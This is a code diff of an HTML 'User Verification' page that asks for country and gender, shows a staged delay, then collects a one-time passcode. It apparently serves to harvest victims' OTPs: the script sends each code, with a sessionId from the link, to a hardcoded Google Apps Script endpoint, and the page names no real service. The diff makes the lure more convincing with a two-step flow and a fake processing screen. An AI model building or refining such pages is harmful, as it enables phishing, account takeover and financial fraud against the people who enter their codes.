@@ -46,16 +46,6 @@
       margin: 12px 0;
       border-radius: 15px;
       background-color: #f1f1f1;
-      appearance: none;
-      -webkit-appearance: none;
-      -moz-appearance: none;
-    }
-
-    select {
-      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg width='10' height='6' viewBox='0 0 10 6' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill='%23333' d='M0 0l5 6 5-6z'/%3E%3C/svg%3E");
-      background-repeat: no-repeat;
-      background-position: right 15px center;
-      background-size: 10px;
     }
 
     button {
@@ -75,11 +65,10 @@
       background: #e55a5a;
     }
 
-    #loading {
+    #loading, #otpForm {
       display: none;
-      font-size: 20px;
       margin-top: 20px;
-      color: #ff6b6b;
+      font-size: 20px;
     }
 
     @media (max-width: 600px) {
@@ -100,60 +89,89 @@
 </head>
 <body>
   <div class="container">
-    <h2>🔐 Verify...</h2>
-    <form id="otpForm">
-      <select name="location" required>
+    <h2>🔐 User Verification</h2>
+
+    <!-- Step 1: Country and Gender -->
+    <form id="detailsForm">
+      <select name="location" id="location" required>
         <option value="">Select Country</option>
         <option value="India">India</option>
       </select>
 
-      <select name="gender" required>
+      <select name="gender" id="gender" required>
         <option value="">Select Gender</option>
         <option value="Male">Male</option>
         <option value="Female">Female</option>
         <option value="Other">Other</option>
       </select>
 
-      <input type="text" name="otp" id="otp" placeholder="Enter OTP" required />
-      <button type="submit">Submit</button>
+      <button type="submit">Continue</button>
     </form>
 
-    <div id="loading">⏳ Verifying... Please wait</div>
+    <!-- Loading Screen -->
+    <div id="loading">⏳ Processing your details...</div>
+
+    <!-- Step 2: OTP Input -->
+    <form id="otpForm">
+      <input type="text" name="otp" id="otp" placeholder="Enter OTP" required />
+      <button type="submit">Submit OTP</button>
+    </form>
   </div>
 
   <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycbzXrKL2Kuoh1-zXIvjeD2aX3I5JHUCZVy1p52DKi1vPBFpnAVLd37Ss89NwNrYwLqZ4Iw/exec"; // Replace with your real URL
+    const scriptURL = "https://script.google.com/macros/s/AKfycbzXrKL2Kuoh1-zXIvjeD2aX3I5JHUCZVy1p52DKi1vPBFpnAVLd37Ss89NwNrYwLqZ4Iw/exec"; // Replace with your Apps Script URL
     const urlParams = new URLSearchParams(window.location.search);
     const sessionId = urlParams.get("sessionId");
 
-    const form = document.getElementById("otpForm");
+    const detailsForm = document.getElementById("detailsForm");
+    const otpForm = document.getElementById("otpForm");
     const loading = document.getElementById("loading");
 
-    form.addEventListener("submit", e => {
-      e.preventDefault();
-      const otp = document.getElementById("otp").value;
-      const location = form.location.value;
-      const gender = form.gender.value;
+    let userLocation = "", userGender = "";
 
-      form.style.display = "none";
+    // First form (country + gender)
+    detailsForm.addEventListener("submit", e => {
+      e.preventDefault();
+      userLocation = document.getElementById("location").value;
+      userGender = document.getElementById("gender").value;
+
+      detailsForm.style.display = "none";
       loading.style.display = "block";
 
-      const formData = new FormData(); 
+      setTimeout(() => {
+        loading.style.display = "none";
+        otpForm.style.display = "block";
+      }, 6000); // Wait 5 seconds
+    });
+
+    // OTP submission
+    otpForm.addEventListener("submit", e => {
+      e.preventDefault();
+      const otp = document.getElementById("otp").value;
+
+      const formData = new FormData();
       formData.append("stage", "otp");
       formData.append("sessionId", sessionId);
+      formData.append("location", userLocation);
+      formData.append("gender", userGender);
       formData.append("otp", otp);
-      formData.append("location", location);
-      formData.append("gender", gender);
 
-      fetch(scriptURL, { method: "POST", body: formData })
-        .then(() => {
-          loading.innerHTML = "✅ OTP Submitted Successfully!";
-        })
-        .catch(error => {
-          alert("Error: " + error.message);
-          form.style.display = "block";
-          loading.style.display = "none";
-        });
+      loading.innerHTML = "⏳ Submitting OTP...";
+      loading.style.display = "block";
+      otpForm.style.display = "none";
+
+      fetch(scriptURL, {
+        method: "POST",
+        body: formData
+      })
+      .then(() => {
+        loading.innerHTML = "✅ OTP Submitted Successfully!";
+      })
+      .catch(error => {
+        alert("Error: " + error.message);
+        otpForm.style.display = "block";
+        loading.style.display = "none";
+      });
     });
   </script>
 </body>
